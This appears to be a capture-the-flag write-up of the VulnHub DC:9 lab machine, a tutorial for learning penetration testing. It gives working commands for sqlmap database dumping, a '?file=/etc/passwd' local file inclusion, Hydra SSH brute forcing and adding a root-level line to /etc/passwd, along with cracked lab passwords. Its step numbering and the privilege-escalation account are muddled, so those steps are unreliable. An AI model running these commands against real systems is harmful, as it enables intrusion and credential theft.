# Web-Application-PenTest
Objective:

The objective of this penetration test was to identify and exploit vulnerabilities in the DC:9 virtual machine provided by VulnHub. The aim was to gain unauthorized access and escalate privileges to obtain the root flag.

---

## 1. Information Gathering

### Current IP Address on Kali Linux

- **IP Address:** 192.168.1.233
- **Command:** `ip a`

![image](https://github.com/user-attachments/assets/1dcd1de7-ac3d-4029-a277-a005bc1714a5)

-Identifying the IP address of your attack machine (Kali Linux) is essential for network-based operations. This step confirms the machine's network identity and ensures that you are targeting the correct IP address in subsequent steps.
### ARP Scan to Find Target's MAC Address

- **Steps:** 
  - Go to VirtualBox Manager
  - Navigate to Target Machine Settings
  - Open the Network Tab
  - Click on Advanced to view MAC Address

- **Command:** `sudo arp-scan -l`

![image](https://github.com/user-attachments/assets/d19a9028-4811-4232-a8a5-0bb8b18087dd)

![image](https://github.com/user-attachments/assets/3ccd4f37-1cc8-4252-af68-99fad3d7c714)

- ARP (Address Resolution Protocol) scans the local network to map IP addresses to MAC addresses. This helps identify devices on the network and confirm the MAC address of the target machine. This information can be crucial for network attacks and ensuring correct targeting.

### Alternative Network Discovery

- **Command:** `sudo netdiscover`

![image](https://github.com/user-attachments/assets/c2306713-5d12-483e-936a-6d7b87e50011)

- Netdiscover is another tool for discovering devices on a network. It can be used as an alternative or supplement to ARP scanning to verify the presence and details of target machines. This helps in cross-checking the network layout and device information.

### Verify Connectivity to Target Machine

- **Command:** `fping 192.168.1.228`
- **Note:** If connectivity is working through your attack and target machine, the output should match the provided screenshot.

![image](https://github.com/user-attachments/assets/d79d2692-6c72-4545-8017-ea0da3b5ba10)

- fping is used to check the reachability of the target machine. This command verifies that the target machine is online and responding to network requests. It helps confirm that there are no connectivity issues before proceeding with further attacks.

## 2. Network Scanning

### Nmap Scan Command

- **Command:** `nmap -A -p- 192.168.1.228`

- **Breakdown:**
  - **nmap:** The command-line tool used for network discovery and security auditing.
  - **-A:** Enables Aggressive Scan with features:
    - OS Detection: Identifies the operating system of the target host.
    - Version Detection: Finds versions of services running on open ports.
    - Script Scanning: Runs predefined scripts to gather more information or check vulnerabilities.
    - Traceroute: Maps the route taken by packets from source to destination.
  - **-p-:** Scans all ports from 1 to 65535.
 
![image](https://github.com/user-attachments/assets/c1ca5dd8-05cd-4f78-97c6-126c58523327)
 
  - Conducting a full port scan with nmap -A provides detailed information about the target system's open ports, running services, and potential vulnerabilities. This step is crucial for identifying entry points for further attacks.

## 3. Web Application Enumeration

### Accessed Website via IP Address

- **URL:** [http://192.168.1.228]

![image](https://github.com/user-attachments/assets/c938c916-bb1e-438b-8488-339c275343cd)
![image](https://github.com/user-attachments/assets/c98ac7f5-b55e-4103-82a8-cedc2ff0da8f)
![image](https://github.com/user-attachments/assets/1710943b-fd19-4005-9a85-0ac6e193e429)


- Accessing the website hosted on the target machine allows you to analyze its functionality and identify potential vulnerabilities.

### Identified Vulnerability: SQL Injection

- **Research Reference:** [Rapid7 Web Application Vulnerabilities](https://www.rapid7.com/fundamentals/web-application-vulnerabilities/)
- **Testing Method:**
  - Use the search query box on the site.
  - Capture request with Burp Suite.
  - Save request to file named `GOT`.
 
  ![image](https://github.com/user-attachments/assets/5211edef-3a90-49ff-9df0-adc7c8787ffb)
 
  -  SQL Injection is a common web application vulnerability that allows attackers to interact with the backend database. By capturing and analyzing HTTP requests, you can identify SQL Injection points and craft payloads to exploit them.

### SQL Injection Testing with Sqlmap

- **Command to Check Databases:**
  ```bash
  sqlmap -r GOT --dbs
  ```
- **Dump Databases and User Info:**
  - **Command:** 
    ```bash
    sqlmap -r GOT -D Staff --dump-all --batch
    ```
  - **Dump Users:**
    ```bash
    sqlmap -r GOT -D users --dump-all --batch

 ![image](https://github.com/user-attachments/assets/d72516a2-5148-4a78-a6b9-3490e4c11621)
 ![image](https://github.com/user-attachments/assets/706e2e73-708f-4c78-b7a5-67206964caf7)
 ![image](https://github.com/user-attachments/assets/7160052a-b952-4dbc-a176-f551ee352d42)
 ![image](https://github.com/user-attachments/assets/445a0093-a450-426a-8cf4-a1d8c5f25ac7)
 
    
  - sqlmap is a powerful tool for automating SQL Injection attacks. It helps identify and extract data from databases compromised through SQL Injection. By dumping databases and user information, you can gather valuable data for further exploitation.

## Note: I found a admin username and password that was hashed and decrypted the Password to login to admin on the website. 
Password decrypted: "transorbital1"

![image](https://github.com/user-attachments/assets/0ed49d40-eb88-4860-9b24-e30b81705f4b)
![image](https://github.com/user-attachments/assets/ddf6f59a-d7fd-4358-aa2a-89562b8f0964)


## 4. Local File Inclusion (LFI)

### Testing for LFI

- **Discovery of LFI Vulnerability:**
  - After obtaining the admin credentials, we logged into the web application and noticed that additional features such as "Manage" and "Add Record" were unlocked. However, the footer now displayed the message "File does not exist," suggesting a file inclusion issue.
  
  - We hypothesized that the missing or misplaced file might be included in the footer dynamically. To investigate this further, we tested the URL parameter used for file inclusion. We appended the `?file=` parameter to the URL, attempting to include various local files.

- **URL Parameter Testing:**
  - We used a common LFI testing URL parameter and tried accessing the `/etc/passwd` file with a URL like:
    ```
    http://example.com/welcome.php?file=/etc/passwd
    ```
  - The application returned the contents of `/etc/passwd`, confirming that the LFI vulnerability exists. This file contains sensitive user information, highlighting the risk of unauthorized access due to improper file inclusion.

  - Local File Inclusion vulnerabilities allow attackers to include files from the server’s filesystem. Testing for LFI helps determine if the application improperly exposes files, potentially revealing sensitive information such as `/etc/passwd`.

![image](https://github.com/user-attachments/assets/2b34303a-cad3-433f-b342-32b53710218c)

## 5. Port Knocking

### Detected Port Knocking Configuration

- **Found in:** `knockd.conf`
- **Port Knocking Sequence:** 
  - Use the sequence to open the SSH port.
 
![image](https://github.com/user-attachments/assets/e74e92c6-28ef-489d-be0a-5bdd31ccfdae)
 
  - Port knocking is a method to obscure services by requiring a specific sequence of network requests to open a port. By detecting and using the correct port knocking sequence, you can access otherwise hidden services, such as SSH.

### Knock Tool Installation and Usage along with nmap

- **Install Knockd:**
  ```bash
  sudo apt-get install knockd
  ```
- **Knock Command:**
  ```bash
  knock <ip address>
  ```
- **nmap Command Syntax for Port Scanning:**
  ```bash
   nmap -p22 192.168.1.228 7469 8475 9842
  ``` 
![image](https://github.com/user-attachments/assets/69371414-fc51-4f58-a2ed-e77014be3c42)
![image](https://github.com/user-attachments/assets/c762dd6d-140a-4cc4-92dd-fc40dc173b94)

- Brute-forcing SSH credentials involves using tools like Hydra to attempt numerous username and password combinations to gain unauthorized access. Creating dictionaries of potential usernames and passwords increases the likelihood of successful login attempts.
## 6. Exploitation

### SSH Access

- **Brute-Force with Hydra:**
  - **Commands to Create Dictionaries:**
    ```bash
    # Create user.txt and pass.txt from user and password columns.
    ```
  - **Hydra Command for SSH:**
    ```bash
    hydra -L user.txt -P pass.txt ssh://192.168.1.228
    ```

- **Successful Credentials:**
  - **User:** janitor
  - **Password:** [Password found]
 
![image](https://github.com/user-attachments/assets/91659bf9-ba80-4232-b10d-0b76c58969ca)

  - Once you successfully brute-force the credentials, you can use them to access the target machine via SSH.

![image](https://github.com/user-attachments/assets/4b4d0235-f88e-4a34-b12c-aa1296212c6e)

## 7. Post-Exploitation Process
 - **Initial Discovery**
 Upon inspecting the files owned by users on the system, we discovered that all users had similar files except for a user named janitor. This user had a file named secrets-for-putin.

 - **Action Taken:**
 Opened secrets-for-putin to locate a password file.
 Accessed the password file, which contained a list of passwords.
![image](https://github.com/user-attachments/assets/2a64bd04-3cab-4cee-8eb6-9051de3764a3)

## 8. Directory Traversal and File Discovery:
 We navigated into a newly discovered hidden directory using the cd command and listed its contents. A text file named passwords-found-on-post-it-notes.txt was found.

Commands:
```bash
cd [.secrets-for-putin/]
ls -a
cat passwords-found-on-post-it-notes.txt
```
![image](https://github.com/user-attachments/assets/2a64bd04-3cab-4cee-8eb6-9051de3764a3)

## 3. Updating Password List
We updated our pass.txt file to include the newly discovered passwords.

Commands:
```bash
nano pass.txt
# Appended new passwords to pass.txt
```
Purpose:
To enrich our password list with newly found credentials, increasing the effectiveness of our brute-force attacks.

## 4. Brute-Forcing with Hydra
We used Hydra to perform a brute-force attack on SSH with the updated password list.

Command:
```bash
hydra -L usernames.txt -P pass.txt ssh://192.168.1.228 ssh
```
![image](https://github.com/user-attachments/assets/16c1edd4-253f-45dd-9134-9d81f73b5ec2)

Purpose:
To test the newly appended passwords against the SSH service and identify valid login credentials.

## 5. Gaining Access as a New User
With the valid credentials obtained, we logged in as the user fredf using the su command.

Credentials:
Username: fredf
Password: B4-Tru3-001

Command:
```bash
su fredf
```
Purpose:
To escalate privileges and gain access to a user account with potential administrative capabilities.

## 6. Checking Sudo Privileges
We examined fredf's sudo privileges to determine if the user could execute any commands with root privileges.

Command:
```bash
sudo -l
```
Observation:
fredf had the ability to run a program called test as root without a password.
Action Taken:
Ran the test program, but no immediate results were observed.
Purpose:
To identify any programs or commands that fredf could execute with root privileges.
![image](https://github.com/user-attachments/assets/bac27ab9-cd02-4a9e-9563-f0b3087ce867)

## 7. Creating a Root User
We created a new root user by modifying the /etc/passwd file.

Commands:
```bash
cat /etc/passwd
```
# Edit /etc/passwd to add a new user:
```bash
sudo su
nano /etc/passwd
Added Line:
nico:$1$randomsalt$hash:0:0::/root:/bin/bash
```
# Create passwd File with the Password Hash:
```bash
nano passwd
```
# Added the hash value
Verify the Update:
```bash
cat /etc/passwd
```
Purpose:
To create a new user with root privileges, enabling full control over the system.

![image](https://github.com/user-attachments/assets/1135ddc4-b21b-400f-bc7e-03a293385615)
![image](https://github.com/user-attachments/assets/60c1004f-f60e-4b27-bb7f-5b9681e93c5b)
![image](https://github.com/user-attachments/assets/d0a52d67-e105-4313-917c-dbf05b90d211)
![image](https://github.com/user-attachments/assets/c5c22480-2fc7-489d-bd09-93ad2b1f049c)

## 8. Logging In as the New Root User
We switched to the new root user nico using the su command.

Credentials:
Username: nico
Password: root

Command:
```bash
su nico
```
Verification:
```bash
id
```
Purpose:
To confirm that the new user nico has root privileges.

![image](https://github.com/user-attachments/assets/ee9d46b5-6b08-4597-b465-113078776792)

## 9. Exploring the Root Directory
We navigated to the root user’s directory to find any files of interest.

Command:
```bash
cd /root
ls -a
```
![image](https://github.com/user-attachments/assets/f95fc214-ef10-4e1f-9b62-f1b8c94d582a)

Observation:
Found a file named flag.txt.
Action Taken:
Opened and read flag.txt using:
```bash
cat flag.txt
```
![image](https://github.com/user-attachments/assets/2132e319-b155-4062-8554-3972f9158be9)

Purpose:
To retrieve the flag or additional sensitive information stored in the root user’s directory.

## Resources 
(https://www.stationx.net/sqlmap-cheat-sheet/)

(https://sushant747.gitbooks.io/total-oscp-guide/content/port_knocking.html)

(https://www.tecmint.com/port-knocking-to-secure-ssh/)

(https://www.stationx.net/how-to-use-hydra/)

(https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)

(https://hashes.com/en/tools/hash_identifier)

(https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---
